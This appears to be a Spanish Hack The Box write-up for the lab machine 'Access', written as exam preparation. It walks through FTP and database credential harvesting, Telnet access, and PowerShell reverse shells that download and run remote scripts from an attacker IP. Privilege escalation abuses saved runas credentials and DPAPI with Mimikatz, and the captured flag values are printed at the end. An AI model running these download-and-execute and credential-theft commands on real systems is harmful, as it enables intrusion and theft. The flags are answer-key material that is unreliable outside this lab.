---
tags:
  - type/writeup
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/Access
dificultad: Media
ip: 10.10.10.98
os: Windows
relacionados:
  - "[[Password Reuse]]"
  - "[[02 - Herramientas/ftp|ftp]]"
  - "[[runas savecred]]"
  - "[[DPAPI Abuse]]"
  - "[[readpst]]"
  - "[[mdb-tools]]"
  - "[[telnet]]"
---
# HackTheBox - Access

## Reconocimiento

Comencé mi fase de reconocimiento con un escaneo de puertos exhaustivo para identificar todos los servicios en ejecución en la máquina `10.10.10.98`. Utilicé `nmap` para obtener detalles sobre los puertos abiertos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports
nmap -sCV -p21,23,80 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

El resultado del escaneo reveló tres servicios principales:
- **Puerto 21 (FTP):** `vsftpd` con inicio de sesión anónimo habilitado.
- **Puerto 23 (Telnet):** Un servicio Telnet de Microsoft.
- **Puerto 80 (HTTP):** Un servidor web Microsoft IIS 7.5, que comúnmente se encuentra en Windows Server 2008 R2.

Al inspeccionar el sitio web en el puerto 80, solo encontré una imagen estática de lo que parecía ser una cámara de seguridad en un centro de datos, sin ninguna otra funcionalidad aparente.


---

## Análisis de Vulnerabilidades

Mi atención se centró de inmediato en el servidor FTP debido a la configuración de acceso anónimo, que es una fuente común de fugas de información.

### Acceso anónimo a FTP

Me conecté al servidor FTP utilizando el usuario `anonymous` sin necesidad de contraseña.
```Bash
ftp 10.10.10.98
Name: anonymous
Password:
```

Una vez dentro, exploré la estructura de directorios y encontré dos archivos de interés:
1. `/Backups/backup.mdb`
2. `/Engineer/Access Control.zip`

**Opción 1):** Procedí a descargar ambos archivos a mi máquina local, asegurándome de usar el modo de transferencia binario para evitar la corrupción de los archivos.
```Fragmento de código
ftp> binary
ftp> get /Backups/backup.mdb
ftp> get "/Engineer/Access Control.zip"
```

**Opción 2:** Descargar todo junto:
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

### Análisis de la Base de Datos (.mdb)

El archivo `backup.mdb` es una base de datos de Microsoft Access. Utilicé `mdb-tools` en mi sistema para inspeccionar su contenido. Primero, listé las tablas disponibles.
```Bash
mdb-tables backup.mdb
```

Entre las tablas, una llamada `auth_user` captó mi atención de inmediato. Exporté su contenido para analizarlo.
```Bash
mdb-export backup.mdb auth_user
```

> [!note] ZKAccess
> 
> La estructura de la base de datos parecía corresponder a una instalación de ZKAccess, un software de control de acceso físico para gestionar lectores de tarjetas y seguridad de edificios.
>
Dentro de la tabla `auth_user`, encontré varias credenciales en texto plano:
>- **admin:** `admin`
>- **engineer:** `access4u@security`
>- **backup_admin:** `admin`

### Análisis del Archivo Comprimido (.zip)

Al intentar descomprimir `Access Control.zip` con la herramienta estándar `unzip`, falló, indicando un método de compresión no soportado. Recurrí a `7z` para obtener más detalles.
```Bash
7z l -slt "Access Control.zip"
```

El análisis reveló que el archivo estaba cifrado con **AES-256**. Afortunadamente, una de las contraseñas que encontré en la base de datos, `access4u@security`, parecía una candidata perfecta. La probé y logré descomprimir el archivo con éxito.
```Bash
7z x "Access Control.zip"
# Password: access4u@security
```

Dentro del archivo comprimido había un único fichero: `Access Control.pst`.

### Análisis del Archivo de Outlook (.pst)

Un archivo `.pst` es un archivo de carpetas personales de Microsoft Outlook, utilizado para almacenar correos electrónicos. Utilicé la herramienta `readpst` para extraer su contenido y examinar los correos.
```Bash
readpst -tea -m "Access Control.pst"
```

Revisando los correos extraídos, encontré uno que contenía la contraseña para la cuenta `security`:
- **security:** `4Cc3ssC0ntr0ller`
    

---

## Explotación de Vulnerabilidades

Con un nuevo par de credenciales en mi poder, tenía una vía de entrada clara a través del servicio Telnet.

### Obtención de Foothold vía Telnet

Utilicé las credenciales `security:4Cc3ssC0ntr0ller` para iniciar sesión en la máquina a través de Telnet.
```Bash
telnet 10.10.10.98
user: security
password: 4Cc3ssC0ntr0ller
```

Tras obtener acceso, confirmé que me encontraba en una sesión de usuario con privilegios limitados y procedí a capturar la bandera de usuario (`user.txt`).

### Estabilización de la Shell

La shell de Telnet es inestable y poco funcional, por lo que mi siguiente paso fue obtener una shell inversa más robusta. Para ello, utilicé un script de PowerShell de la suite **Nishang**.

1. **Preparé el script de reverse shell** (`shell.ps1`) en mi máquina atacante, configurándolo con mi IP y un puerto de escucha.
2. **Inicié un servidor web simple** con Python para servir el script.
    ```Bash
    python3 -m http.server 80
    ```
    
3. **Configuré un listener** en mi máquina con `netcat` para recibir la conexión.
    ```Bash
    nc -lvnp 443
    ```
    
4. **En la máquina víctima**, ejecuté un comando de PowerShell para descargar y ejecutar mi script en memoria.

> [!tip] Ejecución en segundo plano
> 
> Utilicé START /B para ejecutar el comando en segundo plano. Esto evita que la sesión de Telnet se bloquee y permite que la nueva shell tenga el ancho completo de mi terminal, en lugar de estar limitada por la ventana de Telnet.

```PowerShell
START /B "" powershell -c "IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.17/shell.ps1')"
```

Esto me proporcionó una reverse shell de PowerShell estable y completamente funcional.


---

## Escalada de Privilegios

Ya con una shell estable, comencé la fase de enumeración interna para encontrar una ruta hacia el usuario `Administrator`.

### Identificación de Credenciales Guardadas con `runas /savecred`

Ejecute en la maquina victima `winenum.exe` para encontrar alguna vulnerabilidad y apareció que habían credenciales almacenadas.

Uso `cmdkey /list`, que muestra las credenciales guardadas por el Administrador de Credenciales de Windows.
```PowerShell
cmdkey /list1
```

El resultado mostró una credencial guardada para el usuario `ACCESS\Administrator`. Esta configuración suele deberse a que un administrador ha utilizado el comando `runas /savecred` para permitir que un usuario sin privilegios ejecute una aplicación específica como administrador sin tener que introducir la contraseña cada vez.

Para confirmar mi sospecha, busqué archivos de acceso directo (`.lnk`) en el sistema que pudieran estar configurados para usar `runas`.
```PowerShell
Get-ChildItem "C:\" *.lnk -Recurse
```

La búsqueda reveló que el acceso directo `ZKAccess` en el Escritorio Público (`C:\Users\Public\Desktop`) había sido configurado de esta manera.

### Opción 1) Explotación Directa

Dado que la credencial del Administrador estaba guardada para mi sesión de usuario, podía invocar cualquier comando como `Administrator` usando el mismo mecanismo.

Ejecuté una nueva reverse shell de PowerShell, esta vez utilizando `runas /savecred` para ejecutarla con los privilegios de `ACCESS\Administrator`.
```PowerShell
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.17/admin.ps1')"
```

Recibí una nueva conexión en mi listener, ahora como `nt authority\system`, y pude leer la bandera de administrador (`root.txt`).

### Opción 2) Abuso de DPAPI (Ruta Alternativa)

Para ir un paso más allá y extraer la credencial en texto plano, decidí abusar de la **Windows Data Protection API (DPAPI)**, que es el sistema que protege las credenciales guardadas.

1. **Identifiqué los archivos de credenciales y la Masterkey del usuario.** Estos archivos están protegidos como archivos de sistema y se encuentran en el perfil del usuario. Los localicé con el siguiente comando:
    ```DOS
    cmd /c "dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect"
    ```
    
2. **Exfiltré los archivos.** Transferí el archivo de credencial y el archivo de Masterkey a mi máquina codificándolos en Base64 desde la víctima y decodificándolos localmente.
    
3. **Utilicé Mimikatz para descifrar la credencial.**
    
> [!warning] Requisitos para el descifrado
> 
> Para descifrar la Masterkey y, posteriormente, la credencial, se necesita el SID del usuario y su contraseña de inicio de sesión (4Cc3ssC0ntr0ller).

Ejecuté los siguientes comandos en Mimikatz en mi máquina atacante:
```
# 1. Cargar la Masterkey en la caché de Mimikatz usando la contraseña del usuario
dpapi::masterkey /in:<masterkey_file> /sid:<user_sid> /password:4Cc3ssC0ntr0ller

# 2. Descifrar el blob de la credencial usando la Masterkey cargada
dpapi::cred /in:<credential_file>
```

Este proceso me reveló la contraseña del usuario `Administrator` en texto plano, proporcionando una ruta alternativa para la escalada de privilegios.


---

## Bandera(s)

> [!FLAG] `flag{user}`
> 8975029709d937a4927433f7d6488c1f
^bandera

> [!FLAG] `flag{root}`
> 7582f0a40c11589a76aa124dec9cbc91
^bandera